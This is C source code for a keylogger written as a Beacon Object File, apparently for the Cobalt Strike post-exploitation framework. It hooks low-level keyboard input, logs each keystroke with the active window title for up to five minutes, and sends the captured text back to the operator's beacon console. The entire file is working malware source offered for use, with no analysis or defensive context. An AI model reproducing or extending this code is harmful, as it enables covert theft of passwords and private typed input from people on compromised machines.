#include <windows.h>
#include <winternl.h>

#ifdef BOF
#include "beacon.h"

DECLSPEC_IMPORT HMODULE   WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT HHOOK     WINAPI USER32$SetWindowsHookExA(int, HOOKPROC, HINSTANCE, DWORD);
DECLSPEC_IMPORT BOOL      WINAPI USER32$UnhookWindowsHookEx(HHOOK);
DECLSPEC_IMPORT LRESULT   WINAPI USER32$CallNextHookEx(HHOOK, int, WPARAM, LPARAM);
DECLSPEC_IMPORT BOOL      WINAPI USER32$GetMessageA(LPMSG, HWND, UINT, UINT);
DECLSPEC_IMPORT BOOL      WINAPI USER32$TranslateMessage(const MSG*);
DECLSPEC_IMPORT LRESULT   WINAPI USER32$DispatchMessageA(const MSG*);
DECLSPEC_IMPORT int       WINAPI USER32$ToUnicode(UINT, UINT, const BYTE*, LPWSTR, int, UINT);
DECLSPEC_IMPORT BOOL      WINAPI USER32$GetKeyboardState(PBYTE);
DECLSPEC_IMPORT UINT      WINAPI USER32$MapVirtualKeyA(UINT, UINT);
DECLSPEC_IMPORT HWND      WINAPI USER32$GetForegroundWindow(void);
DECLSPEC_IMPORT int       WINAPI USER32$GetWindowTextA(HWND, LPSTR, int);
DECLSPEC_IMPORT BOOL      WINAPI USER32$PostThreadMessageA(DWORD, UINT, WPARAM, LPARAM);
DECLSPEC_IMPORT DWORD     WINAPI KERNEL32$GetCurrentThreadId(void);
DECLSPEC_IMPORT DWORD     WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT void      WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD     WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT int       WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT void    * CDECL  MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT void    * CDECL  MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int       CDECL  MSVCRT$_snprintf(char*, size_t, const char*, ...);

void *__cdecl memcpy(void *dst, const void *src, size_t n) {
    return MSVCRT$memcpy(dst, src, n);
}

void *__cdecl memset(void *dst, int c, size_t n) {
    return MSVCRT$memset(dst, c, n);
}

#define GetModuleHandleA    KERNEL32$GetModuleHandleA
#define SetWindowsHookExA   USER32$SetWindowsHookExA
#define UnhookWindowsHookEx USER32$UnhookWindowsHookEx
#define CallNextHookEx      USER32$CallNextHookEx
#define GetMessageA         USER32$GetMessageA
#define TranslateMessage    USER32$TranslateMessage
#define DispatchMessageA    USER32$DispatchMessageA
#define ToUnicode           USER32$ToUnicode
#define GetKeyboardState    USER32$GetKeyboardState
#define MapVirtualKeyA      USER32$MapVirtualKeyA
#define GetForegroundWindow USER32$GetForegroundWindow
#define GetWindowTextA      USER32$GetWindowTextA
#define PostThreadMessageA  USER32$PostThreadMessageA
#define GetCurrentThreadId  KERNEL32$GetCurrentThreadId
#define GetTickCount        KERNEL32$GetTickCount
#define Sleep               KERNEL32$Sleep
#define CreateThread        KERNEL32$CreateThread
#define WaitForSingleObject KERNEL32$WaitForSingleObject
#define CloseHandle         KERNEL32$CloseHandle
#define WideCharToMultiByte KERNEL32$WideCharToMultiByte
#define _snprintf           MSVCRT$_snprintf
#endif

#define MAX_LOG_SIZE 8192
#define MAX_TITLE    256

static char   g_logBuf[MAX_LOG_SIZE];
static int    g_logPos       = 0;
static DWORD  g_durationMs   = 0;
static DWORD  g_startTick    = 0;
static DWORD  g_hookThreadId = 0;
static HHOOK  g_hook         = NULL;
static HWND   g_lastHwnd     = NULL;

static void appendLog(const char *s) {
    while (*s && g_logPos < MAX_LOG_SIZE - 1)
        g_logBuf[g_logPos++] = *s++;
}

static void checkWindowTitle(void) {
    HWND fg = GetForegroundWindow();
    if (!fg || fg == g_lastHwnd) return;

    g_lastHwnd = fg;

    char title[MAX_TITLE];
    int len = GetWindowTextA(fg, title, MAX_TITLE);
    if (len <= 0) return;
    title[len] = 0;

    appendLog("\n\n[");
    appendLog(title);
    appendLog("]\n");
}

static const char* vkName(DWORD vk) {
    switch (vk) {
        case VK_RETURN:  return "[ENTER]\n";
        case VK_TAB:     return "[TAB]";
        case VK_BACK:    return "[BKSP]";
        case VK_SPACE:   return " ";
        case VK_ESCAPE:  return "[ESC]";
        case VK_DELETE:  return "[DEL]";
        case VK_LEFT:    return "[LEFT]";
        case VK_RIGHT:   return "[RIGHT]";
        case VK_UP:      return "[UP]";
        case VK_DOWN:    return "[DOWN]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:     return "";
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "";
        case VK_MENU: case VK_LMENU: case VK_RMENU:        return "";
        default: return NULL;
    }
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = kb->vkCode;

        if (GetTickCount() - g_startTick >= g_durationMs) {
            PostThreadMessageA(g_hookThreadId, WM_QUIT, 0, 0);
            return CallNextHookEx(g_hook, nCode, wParam, lParam);
        }

        checkWindowTitle();

        const char *name = vkName(vk);
        if (name) {
            appendLog(name);
        } else {
            BYTE keyState[256];
            GetKeyboardState(keyState);
            WCHAR wBuf[4];
            int ret = ToUnicode(vk, MapVirtualKeyA(vk, 0), keyState, wBuf, 4, 0);
            if (ret > 0) {
                char mbBuf[8];
                int mbLen = WideCharToMultiByte(CP_UTF8, 0, wBuf, ret, mbBuf, 8, NULL, NULL);
                if (mbLen > 0) {
                    mbBuf[mbLen] = 0;
                    appendLog(mbBuf);
                }
            } else {
                char hex[12];
                _snprintf(hex, sizeof(hex), "[0x%02X]", vk);
                appendLog(hex);
            }
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

static DWORD WINAPI timerThread(LPVOID param) {
    Sleep(g_durationMs + 500);
    PostThreadMessageA(g_hookThreadId, WM_QUIT, 0, 0);
    return 0;
}

#ifdef BOF
void go(char *args, int alen) {
    datap parser;
    int   duration;

    BeaconDataParse(&parser, args, alen);
    duration = BeaconDataInt(&parser);

    if (duration < 1) duration = 10;
    if (duration > 300) duration = 300;

    memset(g_logBuf, 0, MAX_LOG_SIZE);
    g_logPos     = 0;
    g_lastHwnd   = NULL;
    g_durationMs = (DWORD)duration * 1000;
    g_startTick  = GetTickCount();
    g_hookThreadId = GetCurrentThreadId();

    g_hook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandleA(NULL), 0);
    if (!g_hook) {
        BeaconPrintf(CALLBACK_ERROR, "SetWindowsHookExA failed");
        return;
    }

    HANDLE hTimer = CreateThread(NULL, 0, timerThread, NULL, 0, NULL);

    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    UnhookWindowsHookEx(g_hook);
    g_hook = NULL;

    if (hTimer) {
        WaitForSingleObject(hTimer, 2000);
        CloseHandle(hTimer);
    }

    g_logBuf[g_logPos] = 0;

    if (g_logPos > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "=== Keylogger (%ds) ===\n%s\n=== End ===", duration, g_logBuf);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "No keystrokes captured in %d seconds.", duration);
    }
}
#endif
